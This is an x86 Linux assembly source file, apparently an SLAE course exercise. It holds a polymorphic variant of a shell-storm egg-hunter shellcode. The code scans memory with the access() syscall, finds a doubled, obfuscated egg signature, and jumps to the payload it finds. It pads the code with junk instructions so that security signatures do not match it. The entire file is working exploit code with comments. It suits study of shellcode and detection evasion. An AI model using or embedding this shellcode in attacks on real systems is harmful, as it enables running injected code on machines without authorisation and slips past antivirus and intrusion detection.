; Polymorphic version or egg hunter from http://shell-storm.org/shellcode/files/shellcode-839.php
; 57 bytes (original size 38 bytes)
; Guillaume Kaddouch
; SLAE-681

global _start

section .text

_start:

	xor eax, eax			; zero out eax
	xor edx, edx			; zero out edx
	cld				; clear DF flag
	xor ecx,ecx			; zero out ecx

next_page:

	fldz
	or dx,0xfff			; page aligment: if memory is invalid, skip to the next page

next_address:

	add edx, 0x1			; check next memory address
	push byte 0x20			; 0x20 = 32 = getpid() syscall
	pop eax
	lea ebx, [edx+0x6-0x2]		; 1st arg: ebx = next memory to check (=edx+4)
	inc eax				; 0x21 = 33 = access() syscall
	int 0x80			; eax = access(*memory, 0x0)
	cmp al,0xf2			; if al = 0xf2, page invalid so skip it, jump to next page (ZF = 1)
	jz next_page

	mov eax,0x40804080		; if address not invalid, store obfuscated egg signature into eax
	add eax, 0x10101010		; fix egg signature = 0x50905090
	mov edi,edx			; store current memory content into edi
	scasd				; compare edi & eax, and set ZF = 1 if equal (egg found). Increment edi by 4.
	jnz next_address		; if not our egg, jump to next address
	scasd				; if it is our egg, check next address is equal to our egg too
	jnz decoil			; if not, jump to the next address, going first to a decoil jump
	jmp edi				; our egg was found, jump to shellcode (edi+8)

decoil:
	mov dword esi, 0x11112345	; I like moving data around for no reason
	jmp short next_address		; now get back to work
